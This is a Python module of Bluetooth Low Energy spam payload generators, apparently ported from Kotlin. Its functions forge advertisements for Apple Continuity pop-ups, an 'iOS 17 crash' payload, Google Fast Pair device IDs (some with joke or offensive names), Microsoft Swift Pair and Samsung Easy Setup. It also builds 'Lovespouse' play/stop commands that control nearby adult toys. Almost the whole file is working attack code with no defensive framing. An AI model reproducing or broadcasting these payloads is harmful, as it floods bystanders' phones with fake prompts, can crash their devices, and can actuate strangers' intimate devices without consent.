"""
BLE Spam Payload Generators
全プラットフォーム共通のペイロード生成ロジック
"""

import random
import struct


def hex_to_bytes(hex_str: str) -> bytes:
    return bytes.fromhex(hex_str)


def random_bytes(n: int) -> bytes:
    return bytes(random.randint(0, 255) for _ in range(n))


# Manufacturer IDs
MANUFACTURER_APPLE = 0x004C      # 76
MANUFACTURER_MICROSOFT = 0x0006  # 6
MANUFACTURER_SAMSUNG = 0x0075    # 117
MANUFACTURER_TYPO = 0x00FF       # 255

# Google Fast Pair Service UUID
UUID_GOOGLE_FAST_PAIR = "0000fe2c-0000-1000-8000-00805f9b34fb"

# ============================================================
# Apple Continuity Payloads
# ============================================================

# Matches ContinuityNewDevicePopUpAdvertisementSetGenerator.kt deviceData
APPLE_DEVICES = {
    "AirPods Pro": "0E20",
    "AirPods Max": "0A20",
    "AirPods": "0220",
    "AirPods 2nd Gen": "0F20",
    "AirPods 3rd Gen": "1320",
    "AirPods Pro 2nd Gen": "1420",
    "Beats Flex": "1020",
    "Beats Solo 3": "0620",
    "Powerbeats 3": "0320",
    "Powerbeats Pro": "0B20",
    "Beats Solo Pro": "0C20",
    "Beats Studio Buds": "1120",
    "Beats X": "0520",
    "Beats Studio 3": "0920",
    "Beats Studio Pro": "1720",
    "Beats Fit Pro": "1220",
    "Beats Studio Buds+": "1620",
}

# Matches ContinuityActionModalAdvertisementSetGenerator.kt _nearbyActions
APPLE_ACTION_MODALS = {
    "AppleTV AutoFill": "13",
    "AppleTV Connecting": "27",
    "Join This AppleTV?": "20",
    "AppleTV Audio Sync": "19",
    "AppleTV Color Balance": "1E",
    "Setup New iPhone": "09",
    "Transfer Phone Number": "02",
    "HomePod Setup": "0B",
    "Setup New AppleTV": "01",
    "Pair AppleTV": "06",
    "HomeKit AppleTV Setup": "0D",
    "AppleID for AppleTV?": "2B",
    "Apple Watch": "05",
    "Apple Vision Pro": "24",
    "Connect to other Device": "2F",
    "Software Update": "21",
}

# Matches ContinuityIos17CrashAdvertisementSetGenerator.kt _nearbyActions
# (subset of action modals - only the 12 actions used for the iOS 17 crash)
APPLE_IOS17_CRASH_ACTIONS = {
    "AppleTV AutoFill": "13",
    "AppleTV Connecting": "27",
    "Join This AppleTV?": "20",
    "AppleTV Audio Sync": "19",
    "AppleTV Color Balance": "1E",
    "Setup New iPhone": "09",
    "Transfer Phone Number": "02",
    "HomePod Setup": "0B",
    "Setup New AppleTV": "01",
    "Pair AppleTV": "06",
    "HomeKit AppleTV Setup": "0D",
    "AppleID for AppleTV?": "2B",
}


def apple_new_device_popup(device_key: str = None) -> tuple:
    """Apple Continuity - New Device Pop-up
    Matches ContinuityNewDevicePopUpAdvertisementSetGenerator.kt
    Payload structure:
        [0] continuityType = 0x07 (ProximityPair)
        [1] payloadSize = 0x19 (25)
        [2] prefix = 0x07 (NEW DEVICE)
        [3-4] deviceData key
        [5] status = 0x55
        [6] budsBatteryLevel
        [7] chargingCaseBatteryLevel
        [8] lidOpenCounter
        [9] color = 0x00
        [10] padding = 0x00
        [11-26] 16 random bytes
    """
    if device_key is None:
        device_key = random.choice(list(APPLE_DEVICES.values()))
    payload = (
        "0719"  # continuityType=0x07 ProximityPair, size=0x19
        "07"    # prefix: NEW DEVICE
        + device_key
        + "55"  # status
        + format(random.randint(0, 99), "02x")   # buds battery
        + format(random.randint(0, 79), "02x")   # case battery
        + format(random.randint(0, 255), "02x")   # lid counter
        + "00"  # color
        + "00"  # padding
    )
    payload += random_bytes(16).hex()
    return MANUFACTURER_APPLE, hex_to_bytes(payload)


def apple_not_your_device_popup(device_key: str = None) -> tuple:
    """Apple Continuity - Not Your Device Pop-up
    Matches ContinuityNotYourDevicePopUpAdvertisementSetGenerator.kt
    Same payload structure as new device but prefix = 0x01 (NOT YOUR DEVICE)
    """
    if device_key is None:
        device_key = random.choice(list(APPLE_DEVICES.values()))
    payload = (
        "0719"
        "01"    # prefix: NOT YOUR DEVICE
        + device_key
        + "55"
        + format(random.randint(0, 99), "02x")
        + format(random.randint(0, 79), "02x")
        + format(random.randint(0, 255), "02x")
        + "00"
        + "00"
    )
    payload += random_bytes(16).hex()
    return MANUFACTURER_APPLE, hex_to_bytes(payload)


def apple_new_airtag_popup() -> tuple:
    """Apple Continuity - New AirTag Pop-up
    Matches ContinuityNewAirtagPopUpAdvertisementSetGenerator.kt
    Same payload structure but prefix = 0x05 (NEW AIRTAG)
    """
    device_key = random.choice(["0055", "0030"])  # AirTag, Hermes AirTag
    payload = (
        "0719"
        "05"    # prefix: AIRTAG
        + device_key
        + "55"
        + format(random.randint(0, 99), "02x")
        + format(random.randint(0, 79), "02x")
        + format(random.randint(0, 255), "02x")
        + "00"
        + "00"
    )
    payload += random_bytes(16).hex()
    return MANUFACTURER_APPLE, hex_to_bytes(payload)


def apple_action_modal(action_code: str = None) -> tuple:
    """Apple Continuity - Action Modal (AppleTV, HomePod, etc.)
    Matches ContinuityActionModalAdvertisementSetGenerator.kt
    Payload structure:
        [0] continuityType = 0x0F (NearbyAction)
        [1] payloadSize = 0x05
        [2] flags = 0xC0
        [3] action code
        [4-6] authentication tag (3 random bytes)
    """
    if action_code is None:
        action_code = random.choice(list(APPLE_ACTION_MODALS.values()))
    payload = "0F05C0" + action_code + random_bytes(3).hex()
    return MANUFACTURER_APPLE, hex_to_bytes(payload)


def apple_ios17_crash() -> tuple:
    """Apple Continuity - iOS 17 Crash (patched in iOS 17.2+/18)
    Matches ContinuityIos17CrashAdvertisementSetGenerator.kt
    Same as action modal but with additional appendix bytes:
        [0] continuityType = 0x0F (NearbyAction)
        [1] payloadSize = 0x05
        [2] flags = 0xC0
        [3] action code
        [4-6] authentication tag (3 random bytes)
        [7-9] appendix = 0x000010
        [10-12] random appendix (3 random bytes)
    """
    action_code = random.choice(list(APPLE_IOS17_CRASH_ACTIONS.values()))
    payload = "0F05C0" + action_code
    payload_bytes = hex_to_bytes(payload)
    auth_tag = random_bytes(3)
    appendix = hex_to_bytes("000010")
    random_appendix = random_bytes(3)
    full_payload = payload_bytes + auth_tag + appendix + random_appendix
    return MANUFACTURER_APPLE, full_payload


# ============================================================
# Google Fast Pair Payloads
# ============================================================

# Genuine device IDs from FastPairDevicesAdvertisementSetGenerator.kt
# Full list matching the Kotlin _genuineDeviceIds
FAST_PAIR_DEVICES = {
    "adidas RPT-02 SOL": "DAE096",
    "adidas Z.N.E. 01": "A83C10",
    "AIAIAI TMA-2 (H60)": "002000",
    "AKG N9 Hybrid": "9B7339",
    "Amazfit PowerBuds": "202B3D",
    "Android Auto": "070000",
    "Arduino 101": "470000",
    "ATH-CK1TW": "02D815",
    "ATH-CKS30TW WH": "1EE890",
    "ATH-CKS50TW": "E6E771",
    "ATH-M20xBT": "CAB6B8",
    "ATH-M50xBT2": "9C3997",
    "ATH-SQ1TW": "9939BC",
    "ATH-SQ1TW SVN": "D7102F",
    "ATH-TWX7": "CA7030",
    "B&O Beoplay E6": "05AA91",
    "B&O Beoplay H8i": "03AA91",
    "B&O Earset": "02AA91",
    "Beats Studio Buds": "038F16",
    "Beoplay E8 2.0": "00AA91",
    "Beoplay EX": "D6E870",
    "Beoplay H4": "04AA91",
    "Beoplay H9 3rd Gen": "01AA91",
    "Big Bang e Gen 3": "DF271C",
    "blackbox TRIP II": "DA5200",
    "BLE-Phone": "124366",
    "BLE-TWS": "8D13B9",
    "boAt Airdopes 621": "00A168",
    "boAt Airdopes 441": "1F5865",
    "boAt Airdopes 452": "641630",
    "boAt Airdopes 511v2": "8E5550",
    "boAt Rockerz 355": "21521D",
    "Bose NC 700": "CD8256",
    "Bose QC Ultra Earbuds": "5BACD6",
    "Bose QC Ultra Headphones": "8A31B7",
    "Bose QuietComfort 35 II": "0000F0",
    "Chromebox": "DADE43",
    "Cleer EDGE Voice": "013D8A",
    "Cleer FLOW II": "003D8A",
    "Cleer HALO": "D7E3EB",
    "COUMI TWS-834A": "0F0993",
    "DENON AH-C830NCW": "038B91",
    "DIZO Wireless Power": "213C8C",
    "Ear (2)": "DEE8C0",
    "EDIFIER NeoBuds Pro 2": "9CE3C7",
    "EDIFIER W320TN": "994374",
    "Emporio Armani EA Connected": "0DEC2B",
    "Fake Test Mouse": "C7A267",
    "Fast Pair Headphones": "480000",
    "Fitbit Charge 4": "5CEE3C",
    "Foocorp Foophones": "080000",
    "Galaxy A14": "915CFA",
    "Galaxy A23 5G": "89BAD5",
    "Galaxy A24 5g": "8E1996",
    "Galaxy F04": "A8CAAD",
    "Galaxy M14 5G": "8D16EA",
    "Galaxy S20": "9D7D42",
    "Galaxy S20 5G": "E4E457",
    "Galaxy S21 5G": "06AE20",
    "Galaxy S22 Ultra": "99F098",
    "GLIDiC mameBuds": "8C4236",
    "Google Gphones": "0B0000",
    "Google Pixel Buds": "060000",
    "Hyundai": "9B9872",
    "Jabra Elite 10": "DAD3A6",
    "Jabra Elite 2": "00AA48",
    "Jabra Elite 4": "6BA5C3",
    "Jabra Elite 4 Active": "8C07D2",
    "Jabra Elite 5": "8B0A91",
    "Jabra Elite Speaker": "D5A59E",
    "Jabra Evolve2 65 Flex": "9171BE",
    "Jabra Evolve2 75": "C79B91",
    "Jaybird Vista 2": "C8777E",
    "JBL Buds Pro": "F52494",
    "JBL CLUB ONE": "A8001A",
    "JBL CLUB PRO+ TWS": "A7EF76",
    "JBL ENDURANCE PEAK 3": "D933A7",
    "JBL ENDURANCE PEAK II": "C85D7A",
    "JBL ENDURANCE RUN 2 WIRELESS": "A8F96D",
    "JBL Everest 110GA": "0002F0",
    "JBL Everest 310GA": "F00204",
    "JBL Everest 710GA": "F00208",
    "JBL Flip 6": "821F66",
    "JBL Live 300TWS": "718FA4",
    "JBL LIVE FLEX": "02F637",
    "JBL LIVE PRO 2 TWS": "6C4DE5",
    "JBL LIVE PRO+ TWS": "8CB05C",
    "JBL LIVE220BT": "05C452",
    "JBL LIVE400BT": "F00209",
    "JBL LIVE500BT": "F0020F",
    "JBL LIVE650BTNC": "F00213",
    "JBL LIVE670NC": "A8A72A",
    "JBL LIVE770NC": "0660D7",
    "JBL Pulse 5": "C7D620",
    "JBL REFLECT AERO": "DFD433",
    "JBL REFLECT MINI NC": "02D886",
    "JBL RFL FLOW PRO": "9B735A",
    "JBL SOUNDGEAR SENSE": "D9414F",
    "JBL TUNE 520BT": "664454",
    "JBL TUNE 720BT": "04AFB8",
    "JBL TUNE BEAM": "A8E353",
    "JBL TUNE BUDS": "0F232A",
    "JBL TUNE125TWS": "054B2D",
    "JBL TUNE225TWS": "5BD6C9",
    "JBL TUNE230NC TWS": "A9394A",
    "JBL TUNE660NC": "A8C636",
    "JBL TUNE670NC": "D9964B",
    "JBL TUNE760NC": "038CC7",
    "JBL TUNE770NC": "02DD4F",
    "JBL VIBE BEAM": "F00E97",
    "JBL VIBE BUDS": "9C0AF7",
    "JBL VIBE FLEX": "C7FBCC",
    "JBL WAVE BEAM": "04ACFC",
    "JBL WAVE BUDS": "A92498",
    "JBL WAVE FLEX": "1ED9F9",
    "JBL Xtreme 4": "C9836A",
    "JLab Epic Air ANC": "9CF08F",
    "JLab GO Work 2": "8AADAE",
    "KENWOOD WS-A1": "8CAD81",
    "LG HBS-1010": "F00304",
    "LG HBS-1120": "F00307",
    "LG HBS-1125": "F00308",
    "LG HBS-1500": "F00305",
    "LG HBS-1700": "F00306",
    "LG HBS-2000": "F00309",
    "LG HBS-830": "F00302",
    "LG HBS-835": "F00301",
    "LG HBS-835S": "0003F0",
    "LG HBS-930": "F00303",
    "LG HBS-FL7": "91BD38",
    "LG HBS-FN4": "9AEEA4",
    "LG HBS-SL5": "D6C195",
    "LG HBS-TFN7": "9CD0F3",
    "LG HBS-XL7": "5C4A7E",
    "LG TONE-FREE": "DB8AC7",
    "LG-TONE-FP6": "92255E",
    "LG-TONE-NP3": "625740",
    "LG-TONE-TFP8": "8E14D7",
    "Libratone Q Adapt On-Ear": "003000",
    "LinkBuds": "917E46",
    "LinkBuds S": "1F181A",
    "M&D MW65": "003B41",
    "Major III Voice": "050F0C",
    "Michael Kors Darci 5e": "039F8F",
    "MIDDLETON": "CCBB7E",
    "MINOR III": "052CC7",
    "MOTIF II A.N.C.": "D8058C",
    "MOTO BUDS 065": "9A408A",
    "MOTO BUDS 135": "03C99C",
    "MOTO BUDS 600 ANC": "D5B5F7",
    "Nest Hub Max": "07F426",
    "Nirvana Ion": "011242",
    "NIRVANA NEBULA": "855347",
    "Nokia CB-201": "A8A00E",
    "Nokia SB-101": "6B9304",
    "Nokia Solo Bud+": "8BB0A0",
    "Oladance Wearable Stereo": "8E4666",
    "Oladance Whisper E1": "8BF79A",
    "OnePlus Buds Z": "E07634",
    "OPPO Enco Air3 Pro": "06C197",
    "oraimo FreePods 4": "6B8C65",
    "oraimo FreePods Pro": "21A04E",
    "oraimo OpenCirclet": "99D7EA",
    "Panasonic RP-HD610N": "005BC3",
    "Philips Fidelio T2": "D65F4E",
    "Philips PH805": "C7736C",
    "Philips TAT3508": "0ECE95",
    "Pioneer SE-MS9BN": "00FA72",
    "Pixel 90c": "8D5B67",
    "Pixel Buds": "92BBBD",
    "Pixel Buds A-Series": "8B66AB",
    "Pixel Buds Pro": "9ADB11",
    "Plantronics PLT_K2": "035754",
    "PLT V8200 Series": "035764",
    "POCO Pods": "E6E8B8",
    "Razer Hammerhead TWS": "0E30C3",
    "Razer Hammerhead TWS X": "72EF8D",
    "realme Buds Air 5 Pro": "E6E37E",
    "realme Buds Air 3S": "8C6B6A",
    "realme Buds Air Pro": "8CD10F",
    "realme Buds T100": "D8F4E8",
    "realme TechLife Buds T100": "D5C6CE",
    "Rockerz 255 Max": "D6EE84",
    "ROCKSTER GO": "A8658F",
    "Set up your new Pixel 2": "989D0A",
    "Set up your new Pixel 3 XL": "E64CC6",
    "Sony WF-1000X": "00C95C",
    "Sony WF-1000XM3": "5CC938",
    "Sony WF-1000XM4": "2D7A23",
    "Sony WF-SP700N": "1EC95C",
    "Sony WH-1000XM2": "02C95C",
    "Sony WH-1000XM3": "0DC95C",
    "Sony WH-CH700N": "5CC932",
    "Sony WH-H900N": "5CC928",
    "Sony WH-XB700": "5CC93C",
    "Sony WH-XB900N": "5CC940",
    "Sony WI-1000X": "05C95C",
    "Sony WI-C600N": "0EC95C",
    "Sony WI-SP600N": "5CC914",
    "Sony XM5": "D446A7",
    "soundcore Glow": "CB529D",
    "soundcore Glow Mini": "008F7D",
    "soundcore Liberty 4 NC": "06D8FC",
    "soundcore Motion 300": "9CB881",
    "soundcore Motion X500": "CB2FE7",
    "soundcore Space One": "DEDD6F",
    "Soundcore Spirit Pro GVA": "72FB00",
    "SPACE": "DA0F83",
    "SRS-XB13": "DF4B02",
    "SRS-XB33": "20330C",
    "SRS-XB43": "1E8B18",
    "SRS-XE300": "C6EC5F",
    "SRS-XG300": "1F4627",
    "SRS-XG500": "9CEFD1",
    "SRS-XV800": "C878AA",
    "SUMMIT": "201C7C",
    "Super Device": "E57B57",
    "Sync": "CC93A5",
    "TAG Heuer Calibre E4 42mm": "DF42DE",
    "TAG Heuer Calibre E4 45mm": "1F1101",
    "TCL MOVEAUDIO Neo": "9128CB",
    "TCL MOVEAUDIO S200": "02E2A9",
    "Technics EAH-AZ60M2": "0744B6",
    "Teufel AIRY TWS 2": "DE577F",
    "Teufel REAL BLUE TWS 3": "1EEDF5",
    "TicWatch Pro 3": "6AD226",
    "TicWatch Pro 3 GPS": "8B5A7B",
    "TicWatch Pro 5": "057802",
    "TONE-T80S": "D69B2B",
    "TONE-TF7Q": "1FE765",
    "TWS05": "6C42C0",
    "UA JBL True Wireless Flash X": "997B4A",
    "UA JBL TWS STREAK": "5C0206",
    "Urbanears Juno": "9D00A6",
    "WF-1000XM4": "C8D335",
    "WF-1000XM5": "8A8F23",
    "WF-C500": "DE215D",
    "WF-C700N": "1FBB50",
    "WF-H800 (h.ear)": "C69AFD",
    "WF-SP800N": "0E138D",
    "WH-1000XM4": "01EEB4",
    "WH-1000XM5": "5C7CDC",
    "WH-CH520": "0F2D16",
    "WH-CH720N": "5C4833",
    "WH-H810 (h.ear)": "99C87B",
    "WH-H910N (h.ear)": "9C888B",
    "WH-XB910N": "9A9BDD",
    "WI-1000XM2": "1E955B",
    "WI-C100": "9BE931",
    "WONDERBOOM 3": "05A963",
    "Writing Account Key": "03F5D4",
    "Xiaomi Buds 4 Pro": "DEEA86",
    "Xiaomi Redmi Buds 4 Active": "D90617",
    "Xiaomi Redmi Buds 4 Lite": "C8C641",
    "YH-E700B": "913B0C",
    "Your BMW": "9DB896",
    "YY2963": "03B716",
    "YY7861E": "8C1706",
    "Zone Wireless 2": "E5E2E9",
}

# Debug/custom device IDs from FastPairDebugAdvertisementSetGenerator.kt
FAST_PAIR_DEBUG_DEVICES = {
    "Flipper Zero": "D99CA1",
    "Free Robux": "77FF67",
    "Free VBucks": "AA187F",
    "Rickroll": "DCE9EA",
    "Animated Rickroll": "87B25F",
    "Boykisser": "F38C02",
    "BLM": "1448C9",
    "Xtreme": "D5AB33",
    "Xtreme Cta": "0C0B67",
    "Talking Sasquach": "13B39D",
    "ClownMaster": "AA1FE1",
    "Obama": "7C6CDB",
    "Ryanair": "005EF9",
    "FBI": "E2106F",
    "Tesla": "B37A62",
}

# Non-production device IDs from FastPairNonProductionAdvertisementSetGenerator.kt
FAST_PAIR_NON_PRODUCTION_DEVICES = {
    "Android Auto": "000007",
    "Anti-Spoof Test": "00000A",
    "Arduino 101": "000047",
    "ATS2833_EVB": "1E89A7",
    "Bisto CSR8670 Dev Board": "0001F0",
    "BLE-Phone": "01E5CE",
    "Fast Pair Headphones": "000048",
    "Foocorp Foophones": "000008",
    "Goodyear": "0200F0",
    "Google Gphones": "00000B",
    "LG HBS1110": "001000",
    "Smart Controller 1": "00B727",
    "Smart Setup": "00F7D4",
    "T10": "F00400",
    "Test 00000D": "00000D",
    "Test 000035": "000035",
    "Test Android TV": "000009",
}

# Phone setup device IDs from FastPairPhoneSetupAdvertisementSetGenerator.kt
FAST_PAIR_PHONE_SETUP_DEVICES = {
    "Google Gphones Transfer": "00000C",
    "Galaxy S23 Ultra": "0577B1",
    "Galaxy S20+": "05A9BC",
}


def google_fast_pair(device_id: str = None) -> tuple:
    """Google Fast Pair device advertisement"""
    if device_id is None:
        device_id = random.choice(list(FAST_PAIR_DEVICES.values()))
    service_data = hex_to_bytes(device_id)
    return UUID_GOOGLE_FAST_PAIR, service_data


def google_fast_pair_debug(device_id: str = None) -> tuple:
    """Google Fast Pair debug device advertisement"""
    if device_id is None:
        device_id = random.choice(list(FAST_PAIR_DEBUG_DEVICES.values()))
    service_data = hex_to_bytes(device_id)
    return UUID_GOOGLE_FAST_PAIR, service_data


def google_fast_pair_non_production(device_id: str = None) -> tuple:
    """Google Fast Pair non-production device advertisement"""
    if device_id is None:
        device_id = random.choice(list(FAST_PAIR_NON_PRODUCTION_DEVICES.values()))
    service_data = hex_to_bytes(device_id)
    return UUID_GOOGLE_FAST_PAIR, service_data


def google_fast_pair_phone_setup(device_id: str = None) -> tuple:
    """Google Fast Pair phone setup advertisement"""
    if device_id is None:
        device_id = random.choice(list(FAST_PAIR_PHONE_SETUP_DEVICES.values()))
    service_data = hex_to_bytes(device_id)
    return UUID_GOOGLE_FAST_PAIR, service_data


# ============================================================
# Microsoft Swift Pair Payloads
# ============================================================

# Matches SwiftPairAdvertisementSetGenerator.kt _deviceNames
SWIFT_PAIR_NAMES = [
    "Device 1", "Device 2", "Device 3", "Device 4", "Device 5",
    "Device 6", "Device 7", "Device 8", "Device 9", "Device 10",
]


def microsoft_swift_pair(device_name: str = None) -> tuple:
    """Microsoft Swift Pair advertisement
    Matches SwiftPairAdvertisementSetGenerator.kt
    Payload: 0x030080 + device_name as UTF-8 bytes
    """
    if device_name is None:
        device_name = random.choice(SWIFT_PAIR_NAMES)
    prefix = hex_to_bytes("030080")
    name_bytes = device_name.encode("utf-8")
    payload = prefix + name_bytes
    return MANUFACTURER_MICROSOFT, payload


# ============================================================
# Samsung Easy Setup Payloads
# ============================================================

# Matches EasySetupBudsAdvertisementSetGenerator.kt _genuineBudsIds
SAMSUNG_BUDS = {
    "Fallback Buds": "EE7A0C",
    "Fallback Dots": "9D1700",
    "Light Purple Buds2": "39EA48",
    "Bluish Silver Buds2": "A7C62C",
    "Black Buds Live": "850116",
    "Gray & Black Buds2": "3D8F41",
    "Bluish Chrome Buds2": "3B6D02",
    "Gray Beige Buds2": "AE063C",
    "Pure White Buds": "B8B905",
    "Pure White Buds2": "EAAA17",
    "Black Buds": "D30704",
    "French Flag Buds": "9DB006",
    "Dark Purple Buds Live": "101F1A",
    "Dark Blue Buds": "859608",
    "Pink Buds": "8E4503",
    "White & Black Buds2": "2C6740",
    "Bronze Buds Live": "3F6718",
    "Red Buds Live": "42C519",
    "Black & White Buds2": "AE073A",
    "Sleek Black Buds2": "011716",
}

# Matches EasySetupWatchAdvertisementSetGenerator.kt _genuineWatchIds
SAMSUNG_WATCHES = {
    "Fallback Watch": "1A",
    "White Watch4 Classic 44m": "01",
    "Black Watch4 Classic 40m": "02",
    "White Watch4 Classic 40m": "03",
    "Black Watch4 44mm": "04",
    "Silver Watch4 44mm": "05",
    "Green Watch4 44mm": "06",
    "Black Watch4 40mm": "07",
    "White Watch4 40mm": "08",
    "Gold Watch4 40mm": "09",
    "French Watch4": "0A",
    "French Watch4 Classic": "0B",
    "Fox Watch5 44mm": "0C",
    "Black Watch5 44mm": "11",
    "Sapphire Watch5 44mm": "12",
    "Purpleish Watch5 40mm": "13",
    "Gold Watch5 40mm": "14",
    "Black Watch5 Pro 45mm": "15",
    "Gray Watch5 Pro 45mm": "16",
    "White Watch5 44mm": "17",
    "White & Black Watch5": "18",
    "Black Watch6 Pink 40mm": "1B",
    "Gold Watch6 Gold 40mm": "1C",
    "Silver Watch6 Cyan 44mm": "1D",
    "Black Watch6 Classic 43m": "1E",
    "Green Watch6 Classic 43m": "20",
}


def samsung_buds(device_id: str = None) -> tuple:
    """Samsung Easy Setup - Buds
    Matches EasySetupBudsAdvertisementSetGenerator.kt
    Payload construction:
        prefix = 42098102141503210109
        device bytes from 3-byte hex ID: [0:2] + "01" + [2:] (insert 0x01 between bytes 1 and 2)
        suffix = 063C948E00000000C700
    The Kotlin does: it.key.substring(0,4) + "01" + it.key.substring(4)
    which is equivalent to: devBytes[0], devBytes[1], 0x01, devBytes[2]
    """
    if device_id is None:
        device_id = random.choice(list(SAMSUNG_BUDS.values()))
    # Match Kotlin: it.key.substring(0,4) + "01" + it.key.substring(4)
    # For hex string "EE7A0C" -> "EE7A" + "01" + "0C"
    device_hex = device_id[0:4] + "01" + device_id[4:]
    prefix = hex_to_bytes("42098102141503210109")
    mid = hex_to_bytes(device_hex)
    suffix = hex_to_bytes("063C948E00000000C700")
    payload = prefix + mid + suffix
    return MANUFACTURER_SAMSUNG, payload


def samsung_watch(watch_id: str = None) -> tuple:
    """Samsung Easy Setup - Watch
    Matches EasySetupWatchAdvertisementSetGenerator.kt
    Payload: 010002000101FF000043 + watch_id byte
    """
    if watch_id is None:
        watch_id = random.choice(list(SAMSUNG_WATCHES.values()))
    prefix = hex_to_bytes("010002000101FF000043")
    payload = prefix + hex_to_bytes(watch_id)
    return MANUFACTURER_SAMSUNG, payload


# ============================================================
# Lovespouse Payloads
# ============================================================

# Matches LovespousePlayAdvertisementSetGenerator.kt lovespousePlays
LOVESPOUSE_PLAY_IDS = {
    "Classic 1": "E49C6C",
    "Classic 2": "E7075E",
    "Classic 3": "E68E4F",
    "Classic 4": "E1313B",
    "Classic 5": "E0B82A",
    "Classic 6": "E32318",
    "Classic 7": "E2AA09",
    "Classic 8": "ED5DF1",
    "Classic 9": "ECD4E0",
    "Independent 1-1": "D41F5D",
    "Independent 1-2": "D7846F",
    "Independent 1-3": "D60D7E",
    "Independent 1-4": "D1B20A",
    "Independent 1-5": "D0B31B",
    "Independent 1-6": "D3A029",
    "Independent 1-7": "D22938",
    "Independent 1-8": "DDDEC0",
    "Independent 1-9": "DC57D1",
    "Independent 2-1": "A4982E",
    "Independent 2-2": "A7031C",
    "Independent 2-3": "A68A0D",
    "Independent 2-4": "A13579",
    "Independent 2-5": "A0BC68",
    "Independent 2-6": "A3275A",
    "Independent 2-7": "A2AE4B",
    "Independent 2-8": "AD59B3",
    "Independent 2-9": "ACD0A2",
}

# Matches LovespouseStopAdvertisementSetGenerator.kt lovespouseStops
LOVESPOUSE_STOP_IDS = {
    "Classic Stop": "E5157D",
    "Independent 1 Stop": "D5964C",
    "Independent 2 Stop": "A5113F",
}


def lovespouse_play(device_id: str = None) -> tuple:
    """Lovespouse - Play command
    Matches LovespousePlayAdvertisementSetGenerator.kt
    Payload: FFFF006DB643CE97FE427C + device_id + 03038FAE
    """
    if device_id is None:
        device_id = random.choice(list(LOVESPOUSE_PLAY_IDS.values()))
    prefix = hex_to_bytes("FFFF006DB643CE97FE427C")
    dev = hex_to_bytes(device_id)
    suffix = hex_to_bytes("03038FAE")
    payload = prefix + dev + suffix
    return MANUFACTURER_TYPO, payload


def lovespouse_stop(device_id: str = None) -> tuple:
    """Lovespouse - Stop command
    Matches LovespouseStopAdvertisementSetGenerator.kt
    Payload: FFFF006DB643CE97FE427C + device_id + 03038FAE
    """
    if device_id is None:
        device_id = random.choice(list(LOVESPOUSE_STOP_IDS.values()))
    prefix = hex_to_bytes("FFFF006DB643CE97FE427C")
    dev = hex_to_bytes(device_id)
    suffix = hex_to_bytes("03038FAE")
    payload = prefix + dev + suffix
    return MANUFACTURER_TYPO, payload


# ============================================================
# All generators mapped
# ============================================================

ALL_GENERATORS = {
    # Apple
    "apple_new_device": apple_new_device_popup,
    "apple_not_your_device": apple_not_your_device_popup,
    "apple_new_airtag": apple_new_airtag_popup,
    "apple_action_modal": apple_action_modal,
    "apple_ios17_crash": apple_ios17_crash,
    # Google
    "google_fast_pair": google_fast_pair,
    "google_fast_pair_debug": google_fast_pair_debug,
    "google_fast_pair_non_production": google_fast_pair_non_production,
    "google_fast_pair_phone_setup": google_fast_pair_phone_setup,
    # Microsoft
    "microsoft_swift_pair": microsoft_swift_pair,
    # Samsung
    "samsung_buds": samsung_buds,
    "samsung_watch": samsung_watch,
    # Lovespouse
    "lovespouse_play": lovespouse_play,
    "lovespouse_stop": lovespouse_stop,
}
